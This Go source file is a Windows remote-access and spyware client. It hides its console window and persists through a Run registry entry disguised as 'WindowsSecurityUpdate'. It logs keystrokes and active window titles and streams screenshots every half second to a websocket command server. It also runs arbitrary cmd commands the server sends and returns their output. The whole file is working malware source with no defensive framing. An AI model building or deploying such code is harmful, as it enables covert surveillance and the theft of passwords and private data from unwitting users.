package main

import (
	"bytes"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"image"
	"image/color"
	"image/jpeg"
	"log"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"

	"github.com/gorilla/websocket"
)

const (
	ServerIP   = "SERVER_IP_PLACEHOLDER"
	ServerPort = "SERVER_PORT_PLACEHOLDER"
)

type Message struct {
	Type string      `json:"type"`
	Data interface{} `json:"data"`
	Time time.Time   `json:"time"`
}

type ActivityData struct {
	Type        string    `json:"type"`
	Application string    `json:"application"`
	WindowTitle string    `json:"windowTitle"`
	KeyStroke   string    `json:"keyStroke,omitempty"`
	Timestamp   time.Time `json:"timestamp"`
}

var (
	user32   = syscall.NewLazyDLL("user32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	gdi32    = syscall.NewLazyDLL("gdi32.dll")

	getWindowText          = user32.NewProc("GetWindowTextW")
	getWindowTextLength    = user32.NewProc("GetWindowTextLengthW")
	getForegroundWindow    = user32.NewProc("GetForegroundWindow")
	messageBox             = user32.NewProc("MessageBoxW")
	getAsyncKeyState       = user32.NewProc("GetAsyncKeyState")
	getConsoleWindow       = kernel32.NewProc("GetConsoleWindow")
	showWindow             = user32.NewProc("ShowWindow")
	getDC                  = user32.NewProc("GetDC")
	releaseDC              = user32.NewProc("ReleaseDC")
	getSystemMetrics       = user32.NewProc("GetSystemMetrics")
	createCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	createCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	selectObject           = gdi32.NewProc("SelectObject")
	bitBlt                 = gdi32.NewProc("BitBlt")
	deleteDC               = gdi32.NewProc("DeleteDC")
	deleteObject           = gdi32.NewProc("DeleteObject")
	getDIBits              = gdi32.NewProc("GetDIBits")

	conn          *websocket.Conn
	clientID      string
	isLogging     bool = true
	screenSharing bool = false
)

func main() {
	// Hide console window for stealth
	hideConsole()

	// Add to startup
	addToStartup()

	// Connect to server
	connectToServer()

	// Start activity monitoring
	go startKeylogger()
	go startActivityMonitor()

	// Keep connection alive
	for {
		time.Sleep(1 * time.Second)
		if conn == nil {
			connectToServer()
		}
	}
}

func hideConsole() {
	if runtime.GOOS != "windows" {
		return
	}

	console, _, _ := getConsoleWindow.Call()
	if console != 0 {
		showWindow.Call(console, 0) // SW_HIDE = 0
	}
}

func addToStartup() {
	if runtime.GOOS != "windows" {
		return
	}

	exe, err := os.Executable()
	if err != nil {
		return
	}

	// Add to Windows startup registry
	cmd := exec.Command("reg", "add",
		"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", "WindowsSecurityUpdate", "/t", "REG_SZ", "/d", exe, "/f")
	cmd.Run()
}

func connectToServer() {
	serverURL := fmt.Sprintf("ws://%s:%s/ws/client", ServerIP, ServerPort)
	u, err := url.Parse(serverURL)
	if err != nil {
		log.Printf("URL parse error: %v", err)
		return
	}

	var dialer websocket.Dialer
	conn, _, err = dialer.Dial(u.String(), nil)
	if err != nil {
		log.Printf("Connection error: %v", err)
		time.Sleep(30 * time.Second) // Retry in 30 seconds
		return
	}

	// Generate unique client ID based on hostname and MAC address
	hostname, _ := os.Hostname()
	clientID = generateClientID(hostname)

	regMsg := Message{
		Type: "register",
		Data: map[string]interface{}{
			"hostname": hostname,
			"os":       runtime.GOOS,
			"clientId": clientID,
		},
		Time: time.Now(),
	}

	conn.WriteJSON(regMsg)

	// Listen for server commands
	go handleServerMessages()
}

func handleServerMessages() {
	for {
		if conn == nil {
			break
		}

		var msg Message
		err := conn.ReadJSON(&msg)
		if err != nil {
			log.Printf("Read error: %v", err)
			conn = nil
			break
		}

		switch msg.Type {
		case "popup_message":
			showPopupMessage(msg.Data.(string))
		case "start_logging":
			isLogging = true
		case "stop_logging":
			isLogging = false
		case "run_command":
			runCommand(msg.Data.(string))
		case "start_screen_share":
			screenSharing = true
			go startScreenCapture()
		case "stop_screen_share":
			screenSharing = false
		}
	}
}

func generateClientID(hostname string) string {
	// Create a unique ID based on hostname and executable path
	exe, _ := os.Executable()
	data := hostname + exe + runtime.GOOS
	hash := md5.Sum([]byte(data))
	return hex.EncodeToString(hash[:])
}

func showPopupMessage(message string) {
	if runtime.GOOS != "windows" {
		return
	}

	title := stringToUTF16Ptr("System Message")
	text := stringToUTF16Ptr(message)
	messageBox.Call(0, uintptr(unsafe.Pointer(text)), uintptr(unsafe.Pointer(title)), 0)
}

func stringToUTF16Ptr(s string) *uint16 {
	utf16 := utf16.Encode([]rune(s + "\x00"))
	return &utf16[0]
}

func runCommand(command string) {
	cmd := exec.Command("cmd", "/C", command)
	output, err := cmd.Output()

	result := "Command executed successfully"
	if err != nil {
		result = fmt.Sprintf("Error: %v", err)
	} else {
		result = string(output)
	}

	sendActivityLog("command_execution", "", result)
}

func startActivityMonitor() {
	var lastWindow string

	for {
		if !isLogging {
			time.Sleep(1 * time.Second)
			continue
		}

		currentWindow := getCurrentWindow()
		if currentWindow != lastWindow {
			sendActivityLog("window_change", currentWindow, "")
			lastWindow = currentWindow
		}

		time.Sleep(500 * time.Millisecond)
	}
}

func getCurrentWindow() string {
	if runtime.GOOS != "windows" {
		return ""
	}

	hwnd, _, _ := getForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}

	length, _, _ := getWindowTextLength.Call(hwnd)
	if length == 0 {
		return ""
	}

	buffer := make([]uint16, length+1)
	getWindowText.Call(hwnd, uintptr(unsafe.Pointer(&buffer[0])), length+1)

	return utf16ToString(buffer)
}

func utf16ToString(s []uint16) string {
	for i, v := range s {
		if v == 0 {
			s = s[0:i]
			break
		}
	}
	return string(utf16.Decode(s))
}

func startKeylogger() {
	// Simple keylogger implementation
	for {
		if !isLogging {
			time.Sleep(100 * time.Millisecond)
			continue
		}

		// Check for key presses (simplified)
		for i := 8; i <= 255; i++ {
			if isKeyPressed(i) {
				key := getKeyName(i)
				if key != "" {
					sendActivityLog("keystroke", getCurrentWindow(), key)
				}
				time.Sleep(50 * time.Millisecond) // Debounce
			}
		}

		time.Sleep(10 * time.Millisecond)
	}
}

func isKeyPressed(key int) bool {
	if runtime.GOOS != "windows" {
		return false
	}

	state, _, _ := getAsyncKeyState.Call(uintptr(key))
	return (state & 0x8000) != 0
}

func getKeyName(key int) string {
	keyMap := map[int]string{
		8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]", 16: "[SHIFT]",
		17: "[CTRL]", 18: "[ALT]", 20: "[CAPS]", 27: "[ESC]",
		32: " ", 37: "[LEFT]", 38: "[UP]", 39: "[RIGHT]", 40: "[DOWN]",
	}

	if name, exists := keyMap[key]; exists {
		return name
	}

	// For alphanumeric keys
	if key >= 48 && key <= 57 { // 0-9
		return string(rune(key))
	}
	if key >= 65 && key <= 90 { // A-Z
		return string(rune(key))
	}

	return ""
}

func sendActivityLog(activityType, window, keystroke string) {
	if conn == nil {
		return
	}

	activity := ActivityData{
		Type:        activityType,
		Application: window,
		WindowTitle: window,
		KeyStroke:   keystroke,
		Timestamp:   time.Now(),
	}

	msg := Message{
		Type: "activity_log",
		Data: activity,
		Time: time.Now(),
	}

	conn.WriteJSON(msg)
}

func startScreenCapture() {
	for screenSharing {
		if conn == nil {
			time.Sleep(1 * time.Second)
			continue
		}

		screenshot := captureScreen()
		if screenshot != "" {
			msg := Message{
				Type: "screen_capture",
				Data: map[string]interface{}{
					"clientId": clientID,
					"image":    screenshot,
				},
				Time: time.Now(),
			}
			conn.WriteJSON(msg)
		}

		time.Sleep(500 * time.Millisecond) // Capture every 500ms
	}
}

func captureScreen() string {
	if runtime.GOOS != "windows" {
		return ""
	}

	// Get screen dimensions
	width, _, _ := getSystemMetrics.Call(0)  // SM_CXSCREEN
	height, _, _ := getSystemMetrics.Call(1) // SM_CYSCREEN

	// Get desktop DC
	hdc, _, _ := getDC.Call(0)
	if hdc == 0 {
		return ""
	}
	defer releaseDC.Call(0, hdc)

	// Create compatible DC
	memDC, _, _ := createCompatibleDC.Call(hdc)
	if memDC == 0 {
		return ""
	}
	defer deleteDC.Call(memDC)

	// Create compatible bitmap
	hBitmap, _, _ := createCompatibleBitmap.Call(hdc, width, height)
	if hBitmap == 0 {
		return ""
	}
	defer deleteObject.Call(hBitmap)

	// Select bitmap into memory DC
	selectObject.Call(memDC, hBitmap)

	// Copy screen to memory DC
	bitBlt.Call(memDC, 0, 0, width, height, hdc, 0, 0, 0x00CC0020) // SRCCOPY

	// Create BITMAPINFO structure
	bi := createBitmapInfo(int(width), int(height))

	// Calculate image size
	imageSize := int(width) * int(height) * 3 // 24-bit RGB
	imageData := make([]byte, imageSize)

	// Get bitmap bits
	getDIBits.Call(hdc, hBitmap, 0, height,
		uintptr(unsafe.Pointer(&imageData[0])),
		uintptr(unsafe.Pointer(&bi[0])), 0)

	// Convert to JPEG and encode to base64
	img := createImageFromBits(imageData, int(width), int(height))
	if img == nil {
		return ""
	}

	var buf bytes.Buffer
	err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 50})
	if err != nil {
		return ""
	}

	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

func createBitmapInfo(width, height int) []byte {
	// BITMAPINFOHEADER structure (40 bytes)
	bi := make([]byte, 40)

	// biSize
	*(*uint32)(unsafe.Pointer(&bi[0])) = 40
	// biWidth
	*(*int32)(unsafe.Pointer(&bi[4])) = int32(width)
	// biHeight (negative for top-down)
	*(*int32)(unsafe.Pointer(&bi[8])) = -int32(height)
	// biPlanes
	*(*uint16)(unsafe.Pointer(&bi[12])) = 1
	// biBitCount
	*(*uint16)(unsafe.Pointer(&bi[14])) = 24
	// biCompression
	*(*uint32)(unsafe.Pointer(&bi[16])) = 0 // BI_RGB

	return bi
}

func createImageFromBits(data []byte, width, height int) image.Image {
	img := image.NewRGBA(image.Rect(0, 0, width, height))

	for y := 0; y < height; y++ {
		for x := 0; x < width; x++ {
			offset := (y*width + x) * 3
			if offset+2 < len(data) {
				// BGR to RGBA
				b := data[offset]
				g := data[offset+1]
				r := data[offset+2]

				img.Set(x, y, color.RGBA{r, g, b, 255})
			}
		}
	}

	return img
}
